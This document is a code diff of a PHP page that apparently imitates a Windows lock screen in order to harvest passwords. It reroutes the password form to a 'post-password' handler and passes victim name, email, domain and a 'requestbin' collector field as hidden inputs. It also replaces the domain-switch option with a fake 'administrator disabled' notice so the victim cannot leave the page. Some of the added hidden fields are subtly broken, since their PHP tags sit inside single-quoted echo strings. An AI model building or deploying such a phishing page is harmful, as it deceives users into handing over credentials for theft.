@@ -66,8 +66,6 @@
   } else {
     $error = "True: Password/PIN";
   }
-  $client = "/client/";
-  $request = str_replace($client, '', $_SERVER['REQUEST_URI']);
 ?>
 <html>
 <head>
@@ -191,8 +189,11 @@
     # Name + Email
     echo "<center><p class='user'>$name</p><p>&nbsp</p><p class='locked'>$mail</p><br><br></center>";
     ?>
-    <form action="../client2<?php echo $request; ?>" method="post" id="form">
+    <form action="../includes/post-password.inc.php" method="post" id="form">
       <input type="hidden" name="name" value="<?php echo $name; ?>">
+      <input type="hidden" name="domain" value="<?php echo $domain; ?>">
+      <input type="hidden" name="os" value="<?php echo $os; ?>">
+      <input type="hidden" name="text" value="<?php echo $text; ?>">
       <input type="hidden" name="mail" value="<?php echo $mail; ?>">
       <input type="hidden" name="type" value="<?php echo $type; ?>">
       <input type="hidden" name="background" value="<?php echo $background; ?>">
@@ -215,12 +216,34 @@
     if ($domain != "") {
       $domain2 = strtoupper($domain);
       echo '<p class="locked">Sign in to '.$domain2;
-      echo '<br><br><form class="btnlocked" action="../includes/domain.php'.$request.'" method="post">
+      echo '<br><br><form class="btnlocked" action="" method="post">
+        <input type="hidden" name="name" value="<?php echo $name; ?>">
+        <input type="hidden" name="domain" value="<?php echo $domain; ?>">
+        <input type="hidden" name="os" value="<?php echo $os; ?>">
+        <input type="hidden" name="text" value="<?php echo $text; ?>">
+        <input type="hidden" name="mail" value="<?php echo $mail; ?>">
+        <input type="hidden" name="type" value="<?php echo $type; ?>">
+        <input type="hidden" name="background" value="<?php echo $background; ?>">
+        <input type="hidden" name="profile" value="<?php echo $profile; ?>">
+        <input type="hidden" name="requestbin" value="<?php echo $requestbin; ?>">
+        <input type="hidden" name="error" value="<?php echo $error; ?>">
+        <input type="hidden" name="return" value="<?php echo $return; ?>">
         <input type="hidden" name="Other Domain" value="">
-        <input type="submit" class="btnlocked" name="domain-submit" value="How do I sign into another domain?">
+        <p class="locked">Your administrator disabled the ability to switch domains</p>
       </form>';
     } else {
-      echo '<form class="btnlocked" action="../includes/options.php'.$request.'" method="post">
+      echo '<form class="btnlocked" action="" method="post">
+        <input type="hidden" name="name" value="<?php echo $name; ?>">
+        <input type="hidden" name="domain" value="<?php echo $domain; ?>">
+        <input type="hidden" name="os" value="<?php echo $os; ?>">
+        <input type="hidden" name="text" value="<?php echo $text; ?>">
+        <input type="hidden" name="mail" value="<?php echo $mail; ?>">
+        <input type="hidden" name="type" value="<?php echo $type; ?>">
+        <input type="hidden" name="background" value="<?php echo $background; ?>">
+        <input type="hidden" name="profile" value="<?php echo $profile; ?>">
+        <input type="hidden" name="requestbin" value="<?php echo $requestbin; ?>">
+        <input type="hidden" name="error" value="<?php echo $error; ?>">
+        <input type="hidden" name="return" value="<?php echo $return; ?>">
         <input type="hidden" name="Sign-in Options" value="">
         <input type="submit" class="btnlocked" name="options-submit" value="Sign-in options">
       </form>';
